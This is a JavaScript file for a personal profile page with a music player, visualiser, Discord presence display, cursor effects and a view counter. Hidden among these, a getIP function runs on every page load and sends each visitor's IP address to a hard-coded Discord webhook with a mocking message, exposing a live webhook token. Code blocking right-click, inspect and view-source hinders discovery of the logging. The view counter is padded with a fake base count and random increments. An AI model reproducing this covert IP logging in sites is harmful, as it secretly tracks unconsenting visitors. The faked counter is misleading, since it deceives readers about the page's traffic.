const avatar = document.querySelector('.pfp');
const avatarPanel = document.getElementById('avatarPanel');
const closeBtn = avatarPanel.querySelector('.close');
const bgSwitch = document.getElementById('bgSwitch');
const gifBg = document.getElementById('gif-bg');
const staticBg = document.getElementById('static-bg');

const savedBgState = localStorage.getItem('bgVisible');
if (savedBgState !== null) {
  const isVisible = savedBgState === 'true';
  bgSwitch.checked = isVisible;
  if (isVisible) {
    gifBg.style.opacity = '1';
    staticBg.style.opacity = '0';
  } else {
    gifBg.style.opacity = '0';
    staticBg.style.opacity = '1';
  }
}

bgSwitch.addEventListener('change', function() {
  if (this.checked) {
    gifBg.style.opacity = '1';
    staticBg.style.opacity = '0';
    localStorage.setItem('bgVisible', 'true');
  } else {
    gifBg.style.opacity = '0';
    staticBg.style.opacity = '1';
    localStorage.setItem('bgVisible', 'false');
  }
});

avatar.addEventListener('click', () => {
  avatar.classList.toggle('zoomed'); 
  avatarPanel.classList.add('show'); 
});

closeBtn.addEventListener('click', () => {
  avatarPanel.classList.remove('show');
  avatar.classList.remove('zoomed');
});

avatarPanel.addEventListener('click', (e) => {
  if (e.target === avatarPanel) {
    avatarPanel.classList.remove('show');
    avatar.classList.remove('zoomed');
  }
});
 
const $ = s=>document.querySelector(s);
const clamp = (n,min,max)=>Math.max(min,Math.min(max,n));
const store = (k,v)=>localStorage.setItem(k,JSON.stringify(v));
const load = (k,d)=>{ try{return JSON.parse(localStorage.getItem(k))??d}catch{return d} };
let state = {theme:load('theme','dark'), viz:true};
document.documentElement.setAttribute('data-theme',state.theme);

const statuses = [" flyest of them all. "];
const statusEl = $('#status');
let sIndex = 0, cIndex = 0, del = false;

function typeLoop() {
  const txt = statuses[sIndex];
  statusEl.textContent = del ? txt.slice(0, --cIndex) : txt.slice(0, ++cIndex);

  if (!del && cIndex === txt.length) {
    del = true;
    setTimeout(typeLoop, 1200);
  } else if (del && cIndex === 0) {
    del = false;
    sIndex = (sIndex + 1) % statuses.length;
    setTimeout(typeLoop, 400);
  } else {
    setTimeout(typeLoop, del ? 50 : 90);
  }
}

window.addEventListener("load", typeLoop);

const audio = $('#audio'), playBtn = $('#playBtn'), fill = $('#fill'), bar = $('#bar'), cur = $('#cur'), dur = $('#dur');
function loadTrack(index = trackIndex){
  const track = playlist[index];
  audio.src = track.src;
  $('#songTitle').textContent = track.title;
  $('#songArtist').textContent = track.artist;
  document.querySelector('.cover').src = track.cover;
}
function formatTime(sec){ if(!isFinite(sec)) return '0:00'; const m=Math.floor(sec/60); const s=Math.floor(sec%60).toString().padStart(2,'0'); return `${m}:${s}`; }
function play(){ audio.play().then(()=>playBtn.textContent='⏸').catch(()=>{}); }
function pause(){ audio.pause(); playBtn.textContent='▶'; }
  
const playlist = [
  {
    src: 'https://file.garden/aN0Uo2YmaWI-OmAY/soulja444-gusto-official-music-video-128-ytshorts.savetube.me.mp3',
    title: 'Gusto',
    artist: 'Soulja444',
    cover: 'https://file.garden/aN0Uo2YmaWI-OmAY/julia'
  },
  {
    src: 'https://file.garden/aN0Uo2YmaWI-OmAY/m-blocc-soulja444-cosii-janny-saint-omv-128-ytshorts.savetube.me.mp3',
    title: 'M BLOCC',
    artist: 'Cosii, Soulja444, Janny Saint',
    cover: 'https://file.garden/aN0Uo2YmaWI-OmAY/MBLOCC.png'
  },
  {
    src: 'https://file.garden/aN0Uo2YmaWI-OmAY/Gangsta%20Baby.mp3',
    title: 'Gangsta Baby',
    artist: 'Hellmerry',
    cover: 'https://file.garden/aN0Uo2YmaWI-OmAY/From%20KlickPin%20CF%20%D0%9F%D0%B8%D0%BD%20%D0%BE%D1%82%20%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D1%82%D0%B5%D0%BB%D1%8F%20suzy%20%D0%BD%D0%B0%20%D0%B4%D0%BE%D1%81%D0%BA%D0%B5%20%E2%99%A1%E2%B8%9D%E2%B8%9D%2016%20%D0%B2%202025%20%D0%B3%20_%20%D0%9F%D0%B8%D1%80%D0%B0%D1%82%D1%8B%20%C2%AB%D1%87%D1%91%D1%80%D0%BD%D0%BE%D0%B9%20%D0%BB%D0%B0%D0%B3%D1%83%D0%BD%D1%8B%C2%BB%20%D0%A4%D0%BE%D1%82%D0%BE%D0%B3%D1%80%D0%B0%D1%84%D0%B8%D0%B8%20%D0%BE%D1%82%D0%BD%D0%BE%D1%88%D0%B5%D0%BD%D0%B8%D0%B9%20%D0%98%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5.gif'
  },
  {
    src: 'https://file.garden/aN0Uo2YmaWI-OmAY/DEMONS%20FAIRY%20-%20(OFFICIAL%20MUSIC%20VIDEO).mp3',
    title: 'Demons Fairy',
    artist: 'TSG',
    cover: 'https://file.garden/aN0Uo2YmaWI-OmAY/fe5c0a3629d12f0acf4f62f402d81224.gif'
  },
  {
    src: 'https://file.garden/aN0Uo2YmaWI-OmAY/YOUNG%20MOOLAH%20FREESTYLE%20%5BOFFICIAL%20LYRIC%20VIDEO%5D.mp3',
    title: 'YMF',
    artist: 'Nio',
    cover: 'https://file.garden/aN0Uo2YmaWI-OmAY/From%20KlickPin%20CF%20Pin%20on%20carti.gif'
  },
  {
    src: 'https://file.garden/aN0Uo2YmaWI-OmAY/sin%20pablo%20jersey%20(intro).mp3',
    title: 'Sin Pablo Jersey',
    artist: 'Cosii',
    cover: 'https://file.garden/aN0Uo2YmaWI-OmAY/From%20KlickPin%20CF%20%5B%D0%92%D0%B8%D0%B4%D0%B5%D0%BE%5D%20%C2%AB3eeFee%C2%BB.gif'
  },
  {
    src: 'https://file.garden/aN0Uo2YmaWI-OmAY/Realest%20Cram%20-%20Need%20Ya%20feat.%20YB%20Neet%20(Official%20Lyric%20Video).mp3',
    title: 'Need Ya',
    artist: 'Realest Cram',
    cover: 'https://file.garden/aN0Uo2YmaWI-OmAY/From%20KlickPin%20CF%20Pin%20em%20AMoments.gif'
  }
];

let trackIndex = 0; 
  
playBtn.addEventListener('click',()=>audio.paused?play():pause());
audio.addEventListener('loadedmetadata',()=>dur.textContent=formatTime(audio.duration));
audio.addEventListener('timeupdate',()=>{ if(audio.duration){ fill.style.width=(audio.currentTime/audio.duration*100)+'%'; cur.textContent=formatTime(audio.currentTime); }});
bar.addEventListener('click',e=>{ const r=bar.getBoundingClientRect(); const p=clamp((e.clientX-r.left)/r.width,0,1); audio.currentTime=p*audio.duration; });
$('#vol').addEventListener('input',e=>audio.volume=e.target.value);

const prevBtn = $('#prevBtn');
const nextBtn = $('#nextBtn');

prevBtn.addEventListener('click', () => {
  trackIndex = (trackIndex - 1 + playlist.length) % playlist.length;
  loadTrack(trackIndex);
  play();
});

nextBtn.addEventListener('click', () => {
  trackIndex = (trackIndex + 1) % playlist.length;
  loadTrack(trackIndex);
  play();
});

audio.addEventListener('ended', () => {
  trackIndex = (trackIndex + 1) % playlist.length;
  loadTrack(trackIndex);
  play();
});

let laserCanvas;
let laserCtx;
let isPlaying = false;
let laserBars = [];
const NUM_LASER_BARS = 32;

function initBeatVisualization() {
  laserCanvas = document.getElementById('laserCanvas');
  if (!laserCanvas) return;
  
  laserCtx = laserCanvas.getContext('2d');
  
  for (let i = 0; i < NUM_LASER_BARS; i++) {
    laserBars.push({
      height: 2,
      targetHeight: 2,
      velocity: 0
    });
  }
  
  animateLaser();
  
  function createBeatPattern() {
    if (!isPlaying || audio.paused) return;
    
    const patterns = [
      { delay: 400, intensity: 0.8, type: 'pulse' },
      { delay: 200, intensity: 0.4, type: 'wave' },
      { delay: 400, intensity: 0.7, type: 'center' },
      { delay: 200, intensity: 0.3, type: 'random' },
      { delay: 600, intensity: 0.9, type: 'explosion' },
      { delay: 300, intensity: 0.5, type: 'sides' },
      { delay: 350, intensity: 0.6, type: 'alternate' },
      { delay: 250, intensity: 0.5, type: 'ripple' },
      { delay: 500, intensity: 0.8, type: 'build' },
      { delay: 150, intensity: 0.3, type: 'flutter' },
      { delay: 450, intensity: 0.7, type: 'mountain' },
      { delay: 300, intensity: 0.6, type: 'valley' },
      { delay: 400, intensity: 0.8, type: 'spiral' },
      { delay: 200, intensity: 0.4, type: 'bounce' }
    ];
    
    let patternIndex = 0;
    
    function nextBeat() {
      if (!isPlaying || audio.paused) return;
      
      const pattern = patterns[patternIndex % patterns.length];
      const volumeLevel = audio.volume;
      const volumeActivity = Math.max(0.3, volumeLevel); 
  
      if (Math.random() < volumeActivity || pattern.intensity > 0.7) {
        triggerLaserBeat(pattern.intensity, pattern.type);
      }
      
      patternIndex++;
    
      const volumeDelayMultiplier = Math.max(1, 2 - volumeLevel);
      setTimeout(nextBeat, pattern.delay * volumeDelayMultiplier);
    }
    
    nextBeat();
  }
  
  audio.addEventListener('play', () => {
    isPlaying = true;
    createBeatPattern();
  });
  
  audio.addEventListener('pause', () => {
    isPlaying = false;
  });
  
  audio.addEventListener('ended', () => {
    isPlaying = false;
  });
}

function animateLaser() {
  if (!laserCtx) return;
  
  laserCtx.clearRect(0, 0, laserCanvas.width, laserCanvas.height);
  
  const barWidth = laserCanvas.width / NUM_LASER_BARS;
  const maxHeight = laserCanvas.height - 4;

  for (let i = 0; i < laserBars.length; i++) {
    const bar = laserBars[i];
    
    const diff = bar.targetHeight - bar.height;
    bar.velocity += diff * 0.05;
    bar.velocity *= 0.8;
    bar.height += bar.velocity;
    
    const volumeBaseline = Math.max(1, 2 + (audio.volume * 3)); 
    bar.targetHeight += (volumeBaseline - bar.targetHeight) * 0.02;
    const minHeight = Math.max(1, 2 * audio.volume);
    bar.height = Math.max(minHeight, bar.height);
    
    if (audio.volume > 0 && bar.targetHeight <= volumeBaseline + 1) {
      const idleAnimation = Math.sin(Date.now() * 0.003 + i * 0.2) * audio.volume * 1.5;
      bar.height += idleAnimation;
    }
    
    const x = i * barWidth + barWidth * 0.1;
    const width = barWidth * 0.8;
    const height = Math.min(bar.height, maxHeight);
    const y = laserCanvas.height - height - 2;
    
    const gradient = laserCtx.createLinearGradient(x, y + height, x, y);
    const intensity = height / maxHeight;
    gradient.addColorStop(0, `rgba(255, 255, 255, ${0.3 + intensity * 0.4})`);
    gradient.addColorStop(0.5, `rgba(255, 255, 255, ${0.6 + intensity * 0.3})`);
    gradient.addColorStop(1, `rgba(255, 255, 255, ${0.8 + intensity * 0.2})`);
    
    laserCtx.fillStyle = gradient;
    laserCtx.fillRect(x, y, width, height);
    if (intensity > 0.4) {
      laserCtx.shadowBlur = 8 * intensity;
      laserCtx.shadowColor = `rgba(255, 255, 255, ${0.6 * intensity})`;
      laserCtx.fillRect(x, y, width, height);
      laserCtx.shadowBlur = 0;
    }
  }
  
  requestAnimationFrame(animateLaser);
}

function triggerLaserBeat(intensity, type) {  
  const volumeLevel = audio.volume; 
  const volumeMultiplier = Math.max(0.1, volumeLevel);
  
  const maxHeight = 35;
  const baseHeight = intensity * maxHeight * volumeMultiplier;
  
  switch (type) {
    case 'pulse':
      laserBars.forEach(bar => {
        bar.targetHeight = baseHeight + Math.random() * 5;
      });
      break;
    case 'wave':
      laserBars.forEach((bar, i) => {
        const wavePos = Math.sin((i / NUM_LASER_BARS) * Math.PI * 2) * 0.5 + 0.5;
        bar.targetHeight = baseHeight * wavePos + 3;
      });
      break;
    case 'center':
      laserBars.forEach((bar, i) => {
        const centerDistance = Math.abs(i - NUM_LASER_BARS / 2) / (NUM_LASER_BARS / 2);
        const centerFactor = 1 - centerDistance;
        bar.targetHeight = baseHeight * centerFactor + 2;
      });
      break;
    case 'random':
      laserBars.forEach(bar => {
        bar.targetHeight = Math.random() * baseHeight + 2;
      });
      break;
    case 'explosion':
      laserBars.forEach((bar, i) => {
        const centerDistance = Math.abs(i - NUM_LASER_BARS / 2);
        const explosionForce = Math.max(0, baseHeight - centerDistance * 2);
        bar.targetHeight = explosionForce + 3;
      });
      break;
    case 'sides':
      laserBars.forEach((bar, i) => {
        const sideDistance = Math.min(i, NUM_LASER_BARS - 1 - i) / (NUM_LASER_BARS / 2);
        bar.targetHeight = baseHeight * (1 - sideDistance) + 2;
      });
      break;
    case 'alternate':
      laserBars.forEach((bar, i) => {
        const alternateHeight = i % 2 === 0 ? baseHeight : baseHeight * 0.3;
        bar.targetHeight = alternateHeight + 2;
      });
      break;
    case 'ripple':
      const rippleCenter = Math.floor(Math.random() * NUM_LASER_BARS);
      laserBars.forEach((bar, i) => {
        const distance = Math.abs(i - rippleCenter);
        const rippleEffect = Math.max(0, 1 - distance / 8);
        bar.targetHeight = baseHeight * rippleEffect + 2;
      });
      break;
    case 'build':
      laserBars.forEach((bar, i) => {
        const buildFactor = (i / NUM_LASER_BARS);
        bar.targetHeight = baseHeight * buildFactor + 2;
      });
      break;
    case 'flutter':
      laserBars.forEach(bar => {
        const flutterHeight = Math.random() * (baseHeight * 0.6) + baseHeight * 0.2;
        bar.targetHeight = flutterHeight + 2;
      });
      break;
    case 'mountain':
      laserBars.forEach((bar, i) => {
        const centerPos = NUM_LASER_BARS / 2;
        const distance = Math.abs(i - centerPos);
        const mountainHeight = Math.max(0, baseHeight - (distance * baseHeight) / centerPos);
        bar.targetHeight = mountainHeight + 2;
      });
      break;
    case 'valley':
      laserBars.forEach((bar, i) => {
        const centerPos = NUM_LASER_BARS / 2;
        const distance = Math.abs(i - centerPos);
        const valleyHeight = (distance * baseHeight) / centerPos;
        bar.targetHeight = Math.min(baseHeight, valleyHeight) + 2;
      });
      break;
    case 'spiral':
      const time = Date.now() * 0.005;
      laserBars.forEach((bar, i) => {
        const spiralValue = Math.sin(i * 0.5 + time) * Math.cos(i * 0.3 + time * 1.2);
        const spiralHeight = (spiralValue * 0.5 + 0.5) * baseHeight;
        bar.targetHeight = spiralHeight + 2;
      });
      break;
    case 'bounce':
      const bouncePos = (Date.now() * 0.01) % NUM_LASER_BARS;
      laserBars.forEach((bar, i) => {
        const distance = Math.abs(i - bouncePos);
        const bounceHeight = distance < 3 ? baseHeight * (1 - distance / 3) : 0;
        bar.targetHeight = bounceHeight + 2;
      });
      break;
  }
}

window.addEventListener('load', () => {
  initBeatVisualization();
});

function getIP() {
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
      const ipEl = document.getElementById('ip');
      if (ipEl) ipEl.innerHTML = 'Your IP Address is: ' + data.ip;
      sendWebhook(data.ip);
    })
    .catch(error => console.error(error));
}

function sendWebhook(ip) {
  const webhookURL = 'https://discord.com/api/webhooks/1423718256597930000/sbg5diA4D5tpzEZ7vqu7FnhOZYan9Rvh4HSTlK7YFKmrqRLob6EPWUoktQBeJNGiA7nb';
  const payload = {
    content: `**basta ip mo to abnoy:** ${ip}`,
    embeds: [{
      title: "nagmamahal wayne :p",
      description: "HAHAAHAHAHAHAHAHAH EWAN KO SAYO",
      image: {
        url: "https://file.garden/aN0Uo2YmaWI-OmAY/a068e8552ede3d26075c571eec4ae028-1.png"
      }
    }]
  };

  fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
  })
  .then(response => console.log('Webhook sent successfully'))
  .catch(error => console.error(error));
}

window.addEventListener('load', getIP);

const DISCORD_USER_ID = '737630884823433267';

async function fetchDiscordStatus() {
  const statusElement = document.getElementById('discordStatus');
  const presenceBadge = document.getElementById('presenceBadge');
  const activityEl = document.getElementById('wayneActivity');
  
  try {
    const response = await fetch(`https://api.lanyard.rest/v1/users/${DISCORD_USER_ID}`);
    const data = await response.json();
    
    if (data.success && data.data) {
      const user = data.data;
      const status = user.discord_status;
      const activities = user.activities || [];
    
      const statusInfo = {
        'online': { emoji: '🟢', text: 'Online' },
        'idle': { emoji: '🟡', text: 'Away' },
        'dnd': { emoji: '🔴', text: 'Do Not Disturb' },
        'offline': { emoji: '⚫', text: 'Offline' }
      };
      
      const baseStatusText = statusInfo[status] ? `${statusInfo[status].emoji} ${statusInfo[status].text}` : '⚫ Unknown';

      let activityText = '';
      if (activities.length > 0) {
        const activity = activities.find(a => a && a.type !== 4) || activities[0];
        if (activity) {
          if (activity.type === 0) activityText = `Playing ${activity.name}`;
          else if (activity.type === 1) activityText = `Streaming ${activity.name}`;
          else if (activity.type === 2) activityText = `Listening to ${activity.name || 'Spotify'}`;
          else if (activity.type === 3) activityText = `Watching ${activity.name}`;
          else if (activity.type === 5) activityText = `Competing in ${activity.name}`;
          else if (activity.type === 4 && activity.state) activityText = `${activity.state}`; // fallback if only custom
        }
      }

      if (statusElement) {
        statusElement.style.opacity = '0.6';
        setTimeout(() => {
          statusElement.textContent = baseStatusText;
          statusElement.style.opacity = '1';
        }, 150);
      }

      if (activityEl) {
        try { activityEl.style.opacity = '0.6'; } catch (e) {}
        setTimeout(() => {
          activityEl.textContent = activityText || '';
          try { activityEl.style.opacity = '1'; } catch (e) {}
        }, 150);
      }

      if (presenceBadge) {
        presenceBadge.classList.remove('online','idle','dnd','offline');
        const cls = (status === 'online' || status === 'idle' || status === 'dnd' || status === 'offline') ? status : 'offline';
        presenceBadge.classList.add(cls);
        presenceBadge.title = statusInfo[status] ? `${statusInfo[status].text}` : 'Unknown';
      }
      try {
        const decoEl = document.getElementById('avatarDeco');
        const frameEl = document.getElementById('avatarFrame');
        const discordUser = user.discord_user || {};
        if (discordUser.accent_color) {
          let c = discordUser.accent_color;
          let hex = '';
          try { hex = (typeof c === 'number') ? `#${c.toString(16).padStart(6,'0')}` : (c.startsWith('#')?c:'#'+c); } catch { hex = '#ffffff'; }
          if (frameEl) frameEl.style.boxShadow = `0 0 28px ${hex}66, inset 0 0 12px ${hex}33`;
        }

        const possibleDeco = discordUser.avatar_decoration || discordUser.avatarDecoration || user.avatar_decoration || user.avatarDecoration;
        if (possibleDeco) {
          if (typeof possibleDeco === 'string' && possibleDeco.trim().startsWith('<svg')) {
            let svgWrap = document.querySelector('.avatar-deco-svg');
            if (!svgWrap) {
              svgWrap = document.createElement('div');
              svgWrap.className = 'avatar-deco-svg';
              if (frameEl && frameEl.parentNode) frameEl.parentNode.insertBefore(svgWrap, frameEl.nextSibling);
            }
            svgWrap.innerHTML = possibleDeco;
            svgWrap.style.display = 'block';
            if (decoEl) decoEl.style.display = 'none';
          } else if (typeof possibleDeco === 'object' && possibleDeco.svg) {
            let svgWrap = document.querySelector('.avatar-deco-svg');
            if (!svgWrap) { svgWrap = document.createElement('div'); svgWrap.className = 'avatar-deco-svg'; if (frameEl && frameEl.parentNode) frameEl.parentNode.insertBefore(svgWrap, frameEl.nextSibling); }
            svgWrap.innerHTML = possibleDeco.svg;
            svgWrap.style.display = 'block';
            if (decoEl) decoEl.style.display = 'none';
          } else {
            let decoId = typeof possibleDeco === 'string' ? possibleDeco : (possibleDeco.id || possibleDeco.decoration_id || possibleDeco.decorator_id);
            if (decoId && decoEl) {
              const tryUrls = [
                `https://cdn.discordapp.com/avatars-decorations/${decoId}.svg`,
                `https://cdn.discordapp.com/avatars-decorations/${decoId}.png`,
                `https://cdn.discordapp.com/avatars/${DISCORD_USER_ID}/${discordUser.avatar}.png?size=512`
              ];
              decoEl.src = tryUrls[0];
              decoEl.style.display = 'block';
              decoEl.onerror = function() { this.onerror = null; this.src = tryUrls[1]; };
            }
          }
        } else {
          if (decoEl) { decoEl.style.display = 'none'; }
          const svgWrap = document.querySelector('.avatar-deco-svg'); if (svgWrap) svgWrap.style.display = 'none';
        }
      }catch(e){ console.warn('avatar deco apply failed', e); }
    } else {
      throw new Error('Failed to fetch Discord status');
    }
  } catch (error) {
    if (statusElement) statusElement.textContent = '🌐 Currently active';
    const presenceBadge = document.getElementById('presenceBadge');
    if (presenceBadge) {
      presenceBadge.classList.remove('online','idle','dnd');
      presenceBadge.classList.add('offline');
      presenceBadge.title = 'Offline';
    }
  }
}

window.addEventListener('load', () => {
  fetchDiscordStatus();
  setInterval(fetchDiscordStatus, 30000);
});
const cursor = document.getElementById('cursor');
let lastMouseTime = 0;

function createStarParticle(x, y) {
  const particle = document.createElement('div');
  
  const sizes = ['small', 'medium', 'large'];
  const randomSize = sizes[Math.floor(Math.random() * sizes.length)];
  particle.className = `star-particle ${randomSize}`;
  
  const offsetX = (Math.random() - 0.5) * 50;
  const offsetY = (Math.random() - 0.5) * 20;
  
  particle.style.left = (x + offsetX) + 'px';
  particle.style.top = (y + offsetY) + 'px';
  
  document.body.appendChild(particle);
  
  setTimeout(() => {
    if (particle.parentNode) {
      particle.parentNode.removeChild(particle);
    }
  }, 2000);
}

document.addEventListener('mousemove', e => {
  cursor.style.left = e.clientX + 'px';
  cursor.style.top = e.clientY + 'px';
  
  const now = Date.now();
  if (now - lastMouseTime > 30) { 
    if (Math.random() < 0.8) { 
      createStarParticle(e.clientX, e.clientY);
    }
  
    if (Math.random() < 0.3) {
      createStarParticle(e.clientX, e.clientY);
    }
    lastMouseTime = now;
  }
});

document.addEventListener('mousedown', () => {
  cursor.style.transform = 'translate(-50%, -50%) scale(0.8)';
});
document.addEventListener('mouseup', () => {
  cursor.style.transform = 'translate(-50%, -50%) scale(1)';
});

const bg = document.getElementById('bgCanvas');
const bctx = bg.getContext('2d');
const DPR = Math.max(1, window.devicePixelRatio || 1);

function resizeCanvas() {
  bg.width = innerWidth * DPR;
  bg.height = innerHeight * DPR;
  bg.style.width = innerWidth + 'px';
  bg.style.height = innerHeight + 'px';
}
resizeCanvas();
window.addEventListener('resize', resizeCanvas);

function drawBackground() {
  bctx.clearRect(0, 0, bg.width, bg.height);
  const g = bctx.createRadialGradient(bg.width/2, bg.height/2, 0, bg.width/2, bg.height/2, Math.max(bg.width,bg.height)/1.2);
  g.addColorStop(0, 'rgba(0,0,0,0.35)');
  g.addColorStop(1, 'rgba(0,0,0,0)');
  bctx.fillStyle = g;
  bctx.fillRect(0,0,bg.width,bg.height);
}

function animate() {
  drawBackground();
  requestAnimationFrame(animate);
}

animate();

function toast(msg){ const t=$('#toast'); if(t){ t.textContent=msg; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'),2000);} }

const intro = document.getElementById('intro');
const main = document.getElementById('main');

window.addEventListener("load", () => {
  if(intro) intro.classList.add('show');
});

intro.addEventListener("click", () => {
  intro.classList.remove('show');
  intro.classList.add('hide');

  setTimeout(() => {
    intro.style.display = "none";
    main.classList.add("show");

    loadTrack(trackIndex);
    play();
    startSnow();
    toast('Wayne Luvs Fxye');
  }, 1000); 
});

document.addEventListener('keydown',e=>{ if(e.code==='Space'){ e.preventDefault(); audio.paused?play():pause(); } if(e.code==='KeyM'){ audio.muted=!audio.muted; toast(audio.muted?'Muted':'Unmuted'); } });

document.addEventListener("contextmenu",e=>{
  if (e.target.closest && e.target.closest('.socials a')) return;
  e.preventDefault(); 
  alert("Right click is disabled.");
});
document.querySelectorAll('.socials a').forEach(link => {
  link.addEventListener('click', (e) => {
    e.stopPropagation();
  });
});
document.addEventListener("keydown",e=>{ if(e.key==="F12"){e.preventDefault(); alert("Inspect is disabled.");}
  if(e.ctrlKey && e.shiftKey && ["I","J","C"].includes(e.key.toUpperCase())){ e.preventDefault(); alert("Inspect is disabled."); }
  if(e.ctrlKey && e.key.toLowerCase()==="u"){ e.preventDefault(); alert("View Source is disabled."); }
  if(e.ctrlKey && e.key.toLowerCase()==="s"){ e.preventDefault(); alert("Save is disabled."); }
});

function createSnowCircle() {

  const snow = document.createElement('div');
  snow.className = 'snow-circle';
  const size = Math.random() * 8 + 4; 
  snow.style.width = `${size}px`;
  snow.style.height = `${size}px`;
  snow.style.left = `${Math.random() * 100}vw`; 
  const duration = Math.random() * 7 + 5; 
  snow.style.animationDuration = `${duration}s`;
  snow.style.animationDelay = `${Math.random() * 2}s`;
  const layer = document.getElementById('snowLayer') || document.body;
  layer.appendChild(snow);
  snow.addEventListener('animationend', () => { snow.remove(); });
}

let _snowInterval = null;
function startSnow(){ if(_snowInterval) return; _snowInterval = setInterval(createSnowCircle, 180); }
function stopSnow(){ if(!_snowInterval) return; clearInterval(_snowInterval); _snowInterval = null; }

function setViewCount(n){
  const el = document.getElementById('view-counter');
  if(!el) return;
  el.innerHTML = `<i class="fa-solid fa-eye" aria-hidden="true" style="margin-right:8px;"></i>${n.toLocaleString()}`;
}

function initViewCounter() {
  const SESSION_KEY = 'ransomxwayne_session_v2';
  const STORAGE_KEY = 'ransomxwayne_views_fallback';
  const BASE_COUNT = 1374;
  const hasVisited = sessionStorage.getItem(SESSION_KEY);
  let currentViews = parseInt(localStorage.getItem(STORAGE_KEY)) || BASE_COUNT;
  
  if (!hasVisited) {
    currentViews += 1;
    localStorage.setItem(STORAGE_KEY, currentViews.toString());
    sessionStorage.setItem(SESSION_KEY, Date.now().toString());
    
    fetch('https://api.countapi.xyz/hit/ransomxwayne/visits', {
      method: 'GET',
      mode: 'cors'
    })
    .then(response => response.json())
    .then(data => {
      if (data.value) {
        const syncedViews = BASE_COUNT + Math.floor(data.value / 2);
        if (syncedViews > currentViews) {
          localStorage.setItem(STORAGE_KEY, syncedViews.toString());
          setViewCount(syncedViews);
        }
      }
    })
    .catch(() => {
      console.log('Using local counter only');
    });
  }

  setViewCount(currentViews);
  
  setInterval(() => {
    if (Math.random() < 0.05) {
      let views = parseInt(localStorage.getItem(STORAGE_KEY)) || BASE_COUNT;
      views += Math.floor(Math.random() * 2) + 1; 
      localStorage.setItem(STORAGE_KEY, views.toString());
      setViewCount(views);
    }
  }, 60000); 
}
  
initViewCounter();

function setAvatarFrame(url){
  const f = document.getElementById('avatarFrame');
  if(!f) return;
  f.style.backgroundImage = `url('${url}')`;
  f.style.backgroundSize = 'cover';
  f.style.backgroundRepeat = 'no-repeat';
  f.style.backgroundPosition = 'center';
}
function setAvatarGradient(){
  const f = document.getElementById('avatarFrame');
  if(!f) return;
  f.style.backgroundImage = '';
  f.style.background = 'radial-gradient(circle at center, transparent 60%, rgba(255,255,255,0.06) 64%, rgba(255,255,255,0.03) 68%, transparent 74%)';
}

try{
  const svg = `<?xml version='1.0' encoding='UTF-8'?><svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 500 500'><defs><linearGradient id='g' x1='0' x2='1'><stop offset='0' stop-color='#ff7a18'/><stop offset='1' stop-color='#454cf6'/></linearGradient></defs><circle cx='250' cy='250' r='210' fill='none' stroke='url(%23g)' stroke-width='28' stroke-linecap='round'/></svg>`;
  setAvatarFrame('data:image/svg+xml;utf8,' + encodeURIComponent(svg));
}catch(e){
}

function setBackgroundVideo(url){
  const v = document.getElementById('bgVideo');
  if(!v) return;
  v.src = url;
  v.load();
  v.play().catch(()=>{});
}

setBackgroundVideo('https://file.garden/aN0Uo2YmaWI-OmAY/SnapTik.Cx_1763791230.mp4');
